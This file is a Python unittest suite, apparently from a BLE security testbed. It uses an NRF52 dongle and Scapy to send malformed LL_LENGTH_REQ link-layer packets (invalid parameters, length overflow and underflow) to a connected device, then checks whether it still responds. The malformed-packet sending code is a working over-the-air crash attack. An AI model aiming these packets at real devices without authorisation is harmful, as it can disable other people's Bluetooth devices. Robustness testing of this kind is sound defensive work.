#!/usr/bin/env python

""" Test suite """

from __future__ import print_function
import sys
import unittest
import itertools
import core.ble as ble
from core.logging_utils import *
from mongodb_database.connect_mongodb import *
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *

from sql_database.connect import insert_data_to_link_layer_tests

log = logging.getLogger(__name__)


class Test_LL_LENGTH_REQ(unittest.TestCase):
    """ Negative Tests for Link Layer LL_LENGTH_REQ """
    @classmethod
    def setUpClass(cls):
        c = config.loadConfig()
        attack='Length Request'
        cls.comPortNRF = c['TESTBED']['COM_PORT_NRF']
        cls.advertiser_address = c['TESTBED']['ADVERTISER_ADDRESS']
        cls.master_address = c['TESTBED']['MASTER_ADDRESS']
        cls.access_address = int(c['TESTBED']['ACCESS_ADDRESS'], 16)
        cls.connection = c['TESTBED']['CONNECTION_TO_DATABASE']
        log.info('Advertiser Address: ' + cls.advertiser_address.upper())
        # Open serial port of NRF52 Dongle
        cls.driver = NRF52Dongle(cls.comPortNRF, '115200')
        date = str(datetime.datetime.today()).split()[0].encode('ascii', 'ignore')

        # Choose from test.conf file  type of database to insert data
        if str(c['TESTBED']['DATABASE_VERSION']) == 'SQL':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)

        elif str(c['TESTBED']['DATABASE_VERSION']) == 'MONGODB':
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        elif str(c['TESTBED']['DATABASE_VERSION']) == 'BOTH':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        else:
            print('Continue with no database')
            pass

    def setUp(self):
        # Connect to device
        connected = ble.connect(self.driver, self.master_address, self.advertiser_address, self.access_address)
        self.assertTrue(connected, "Failed to connect")

    def tearDown(self):
        ble.disconnect(self.driver)

    @classmethod
    def tearDownClass(cls):
        cls.driver.close()

    def test_link_layer_LL_LENGTH_REQ_001(self):
        """"Test LL_LENGTH_REQ with invalid parameters
        Attack Type: CWE-20: Improper Input Validation"""
        log.info("Test LL_LENGTH_REQ with invalid parameters 001")

        invalid_octets = [0,1,26,252,0xffff]
        invalid_times = [0, 1, 327, 2121, 0xffff]

        invalid_LL_LENGTH_REQ_inputs = [invalid_octets, invalid_times, invalid_octets, invalid_times]
        #invalid_LL_LENGTH_REQ_inputs = [0, 1, 26, 252]


        #perm = permutations(invalid_LL_LENGTH_REQ_inputs, 4)

        # produce all permutations
        perm = list(itertools.product(*invalid_LL_LENGTH_REQ_inputs))
        number_of_permutations = len(perm)
        log.info("Total %d Tests" % number_of_permutations)
        for index, parameters in enumerate(perm):
            log.info("Running Test %d of %d" % (index, number_of_permutations))
            # Internal vars
            none_count = 0
            time.sleep(1)
            # Send feature request
            pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ()
            self.driver.send(pkt)

            while True:
                pkt = None
                # Receive packet from the NRF52 Dongle
                data = self.driver.raw_receive()

                if data:
                    # Decode Bluetooth Low Energy Data
                    pkt = BTLE(data)
                    # if packet is incorrectly decoded, you may not be using the dongle
                    if pkt is None:
                        none_count += 1
                        if none_count >= 4:
                            log.error('NRF52 Dongle not detected')
                            sys.exit(0)
                        continue
                    elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
                        # Print slave data channel PDUs summary
                        log.debug("Slave RX <--- " + pkt.summary()[7:])

                    # --------------- Process Link Layer Packets here ------------------------------------
                    if LL_FEATURE_RSP in pkt:
                        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                            max_rx_bytes=parameters[0],
                            max_rx_time = parameters[1],
                            max_tx_bytes = parameters[2],
                            max_tx_time = parameters[3]
                            )
                        self.driver.send(pkt)
                        log.info('Malformed packet was sent')
                        log.debug("Attack Packet:\n" + pkt.show(dump=True))
                        time.sleep(1)
                        pulse = ble.check_pulse_via_mtu_exchange(self.driver, self.access_address)
                        self.assertTrue(pulse, "Device did not repsond to provisioning. Presumed dead....")
                        break


        log.info("Test complete")

    def test_link_layer_LL_LENGTH_REQ_002(self):
        """"Test LL_LENGTH_REQ with length overflow
        Attack Type: CWE-787	Out-of-bounds Write"""
        log.info("Test LL_LENGTH_REQ with  length overflow 002")

        # Internal vars
        none_count = 0
        # Send feature request
        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ()
        self.driver.send(pkt)

        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()

            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.error('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
                    # Print slave data channel PDUs summary
                    log.debug("Slave RX <--- " + pkt.summary()[7:])

                # --------------- Process Link Layer Packets here ------------------------------------
                if LL_FEATURE_RSP in pkt:
                    pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ()
                    pkt.len = 48
                    self.driver.send(pkt)
                    log.info('Malformed packet was sent')
                    log.debug("Attack Packet:\n" + pkt.show(dump=True))
                    time.sleep(1)
                    pulse = ble.check_pulse_via_mtu_exchange(self.driver, self.access_address)
                    self.assertTrue(pulse, "Device did not respond to provisioning. Presumed dead....")
                    break


        log.info("Test complete")

    def test_link_layer_LL_LENGTH_REQ_003(self):
        """"Test LL_LENGTH_REQ with length underflow
        Attack Type: Buffer underflow"""
        log.info("Test LL_LENGTH_REQ with with length underflow 003")

        # Internal vars
        none_count = 0
        # Send feature request
        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ()
        self.driver.send(pkt)

        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()

            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.error('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
                    # Print slave data channel PDUs summary
                    log.debug("Slave RX <--- " + pkt.summary()[7:])

                # --------------- Process Link Layer Packets here ------------------------------------
                if LL_FEATURE_RSP in pkt:
                    pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ()
                    pkt.len = 1
                    self.driver.send(pkt)
                    log.info('Malformed packet was sent')
                    log.debug("Attack Packet:\n" + pkt.show(dump=True))
                    time.sleep(1)
                    pulse = ble.check_pulse_via_mtu_exchange(self.driver, self.access_address)
                    self.assertTrue(pulse, "Device did not repsond to provisioning. Presumed dead....")
                    break

        log.info("Test complete")
